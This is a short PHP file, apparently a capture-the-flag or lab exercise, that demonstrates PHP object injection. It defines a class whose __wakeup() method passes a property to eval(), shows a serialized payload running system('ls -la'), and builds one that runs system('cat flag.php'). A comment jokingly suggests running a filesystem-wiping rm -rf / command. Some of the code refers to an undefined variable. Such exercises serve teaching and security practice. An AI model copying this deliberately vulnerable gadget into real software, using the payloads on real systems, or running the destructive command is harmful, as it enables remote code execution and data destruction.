<?php

/*
a:1:{i:0;O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('ls -la');";}}
example of the payload
*/

class PHPObjectInjection{
    public $inject;
    function __construct(){
    }
    function __wakeup(){
        if(isset($this->inject)){
            eval($this->inject);
        }
    }
}

$obj = new PHPObjectInjection();
$obj->inject = "system('cat flag.php');"; // try rm -no-preserve-root -rf / for fun
echo serialize(["", $obj]);
if(is_array($var1)){
    echo "<br/>".$var1[0]." - ".$var1[1];
} 